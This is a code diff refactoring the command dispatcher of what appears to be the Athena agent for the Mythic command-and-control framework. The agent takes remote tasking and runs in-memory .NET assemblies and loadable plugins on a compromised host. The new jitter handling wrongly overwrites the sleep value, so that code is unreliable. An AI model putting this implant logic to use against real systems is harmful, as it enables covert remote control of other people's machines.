@@ -20,53 +20,10 @@ namespace Athena.Commands
         {
             MythicJob job = Globals.jobs[task.task.id];
             job.started = true;
-            Console.WriteLine(job.task.command);
             switch (job.task.command)
             {
                 case "builtin":
-                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                    job.complete = true;
-                    job.hasoutput = true;
-                    if (string.IsNullOrEmpty(job.taskresult))
-                    {
-                        job.errored = true;
-                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
-                    }
-                    else if (job.taskresult.StartsWith("[ERROR]"))
-                    {
-                        job.errored = true;
-                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
-                    }
-                    break;
-                case "cat":
-                    job.taskresult = checkAndRunPlugin(job.task.command,JsonConvert.DeserializeObject <Dictionary<string, object>>(job.task.parameters));
-                    job.complete = true;
-                    job.hasoutput = true;
-                    if (string.IsNullOrEmpty(job.taskresult))
-                    {
-                        job.errored = true;
-                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
-                    }
-                    else if (job.taskresult.StartsWith("[ERROR]"))
-                    {
-                        job.errored = true;
-                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
-                    }
-                    break;
-                case "cp":
-                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                    job.complete = true;
-                    job.hasoutput = true;
-                    if (string.IsNullOrEmpty(job.taskresult))
-                    {
-                        job.errored = true;
-                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
-                    }
-                    else if (job.taskresult.StartsWith("[ERROR]"))
-                    {
-                        job.errored = true;
-                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
-                    }
+                    checkAndRunPlugin(job);
                     break;
                 case "download":
 
@@ -85,18 +42,18 @@ namespace Athena.Commands
                         {
                             Globals.executeAssemblyTask = job.task.id;
                             ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
+                            job.taskresult = "";
                             job.hasoutput = true;
                             using (var consoleWriter = new ConsoleWriter()) {
                                 var origStdout = Console.Out;
                                 try
                                 {
                                     consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
-
                                     //Set output for our ConsoleWriter
                                     Console.SetOut(consoleWriter);
 
                                     //Start a new thread for our blocking Execute-Assembly
-                                    Globals.executAseemblyThread = new Thread(() =>
+                                    Globals.executeAseemblyThread = new Thread(() =>
                                     {
                                         try
                                         {
@@ -129,14 +86,15 @@ namespace Athena.Commands
                                             Globals.alc.Unload();
                                             Globals.alc = new System.Runtime.Loader.AssemblyLoadContext("Athena");
                                         }
+
                                         return;
                                     });
-
-                                    Globals.executAseemblyThread.IsBackground = true;
+                                    
+                                    Globals.executeAseemblyThread.IsBackground = true;
                                     //Start our assembly.
-                                    Globals.executAseemblyThread.Start();
+                                    Globals.executeAseemblyThread.Start();
                                 }
-                                catch(Exception e)
+                                catch(OperationCanceledException e)
                                 {
                                     //General exception catching
                                     Globals.executeAssemblyTask = "";
@@ -146,30 +104,22 @@ namespace Athena.Commands
                                     job.hasoutput = true;
                                     Console.SetOut(origStdout);
                                 }
+                                catch(Exception e)
+                                {
+                                    Globals.executeAssemblyTask = "";
+                                    job.complete = true;
+                                    job.taskresult = e.Message;
+                                    job.errored = true;
+                                    job.hasoutput = true;
+                                    Console.SetOut(origStdout);
+                                }
                             }
                         }, job.cancellationtokensource.Token);
+                        job.cancellationtokensource.Token.ThrowIfCancellationRequested();
                     }
                     break;
                 case "exit":
-                    Globals.exit = true;
-                    job.complete = true;
-                    job.taskresult = "Exiting";
-                    job.hasoutput = true;
-                    break;
-                case "ifconfig":
-                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                    job.complete = true;
-                    job.hasoutput = true;
-                    if (string.IsNullOrEmpty(job.taskresult))
-                    {
-                        job.errored = true;
-                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
-                    }
-                    else if (job.taskresult.StartsWith("[ERROR]"))
-                    {
-                        job.errored = true;
-                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
-                    }
+                    Environment.Exit(0);
                     break;
                 case "jobs":
                     Task.Run(() => {
@@ -235,21 +185,6 @@ namespace Athena.Commands
                         }
                     });
                     break;
-                case "ls":
-                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                    job.complete = true;
-                    job.hasoutput = true;
-                    if (string.IsNullOrEmpty(job.taskresult))
-                    {
-                        job.errored = true;
-                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
-                    }
-                    else if (job.taskresult.StartsWith("[ERROR]"))
-                    {
-                        job.errored = true;
-                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
-                    }
-                    break;
                 case "load":
                     LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                     job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
@@ -269,36 +204,6 @@ namespace Athena.Commands
                     LoadAssembly loadcs = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                     job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcs.assembly), "test");
                     break;
-                case "mkdir":
-                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                    job.complete = true;
-                    job.hasoutput = true;
-                    if (string.IsNullOrEmpty(job.taskresult))
-                    {
-                        job.errored = true;
-                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
-                    }
-                    else if (job.taskresult.StartsWith("[ERROR]"))
-                    {
-                        job.errored = true;
-                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
-                    }
-                    break;
-                case "mv":
-                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                    job.complete = true;
-                    job.hasoutput = true;
-                    if (string.IsNullOrEmpty(job.taskresult))
-                    {
-                        job.errored = true;
-                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
-                    }
-                    else if (job.taskresult.StartsWith("[ERROR]"))
-                    {
-                        job.errored = true;
-                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
-                    }
-                    break;
                 case "reset-assembly-context":
                     job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
                     job.complete = true;
@@ -309,11 +214,49 @@ namespace Athena.Commands
                     job.complete = true;
                     break;
                 case "sleep":
+                    var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    if (sleepInfo.ContainsKey("sleep"))
+                    {
+                        try
+                        {
+                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["sleep"].ToString());
+                        }
+                        catch
+                        {
+                            job.taskresult += "Invalid sleeptime specified.";
+                            job.errored = true;
+                        }
+                    }
+                    if (sleepInfo.ContainsKey("jitter"))
+                    {
+                        try
+                        {
+                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["jitter"].ToString());
+                        }
+                        catch
+                        {
+                            job.taskresult += "Invalid jitter specified.";
+                            job.errored = true;
+                        }
+                    }
+                    if (!job.errored)
+                    {
+                        job.taskresult = "Sleep updated successfully.";
+                    }
+                    job.complete = true;
+                    job.hasoutput = true;
                     break;
                 case "stop-assembly":
-                    if(Globals.executAseemblyThread != null)
+                    if(Globals.executeAseemblyThread != null)
                     {
-                        Globals.executAseemblyThread.Interrupt();
+                        Globals.executeAseemblyThread.Interrupt();
+                        //Globals.executeAseemblyThread.Abort();
+                        Thread.Sleep(3000);
+                        if (Globals.executeAseemblyThread.IsAlive)
+                        {
+                            //Globals.executeAseemblyThread.Suspend();
+                        }
+
                         job.complete = true;
                         job.taskresult = "Cancellation Requested.";
                         job.hasoutput = true;
@@ -328,10 +271,11 @@ namespace Athena.Commands
                     }
                     break;
                 default:
+                    checkAndRunPlugin(job);
                     //Maybe convert the default to the loaded commands?
                     //Can I have all the default plugins use one "case" statement to load?
-                    job.taskresult = "Command not found.";
-                    job.errored = true;
+                    //job.taskresult = "Command not found.";
+                    //job.errored = true;
                     break;
             }
             if (!string.IsNullOrEmpty(job.taskresult))
@@ -373,6 +317,39 @@ namespace Athena.Commands
             {
                 return "";
             }
+        }
+        static void checkAndRunPlugin(MythicJob job)
+        {
+            job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
+            job.complete = true;
+            job.hasoutput = true;
+            if (string.IsNullOrEmpty(job.taskresult))
+            {
+                job.errored = true;
+                job.taskresult = "Plugin not loaded. Please use load to load the plugin!";
+            }
+            else if (job.taskresult.StartsWith("[ERROR]"))
+            {
+                job.errored = true;
+                job.taskresult = job.taskresult.Replace("[ERROR]", "");
+            }
+
+
+
+
+            //foreach (var kvp in s)
+            //{
+            //    Console.WriteLine("Key: " + kvp.Key);
+            //    Console.WriteLine("Value: " + kvp.Value);
+            //}
+            //if (Globals.loadedcommands.ContainsKey(name))
+            //{
+            //    return AssemblyHandler.RunLoadedCommand(name, s);
+            //}
+            //else
+            //{
+            //    return "";
+            //}
         }
         //static void consoleWriter_WriteEvent(object sender, ConsoleWriterEventArgs e)
         //{
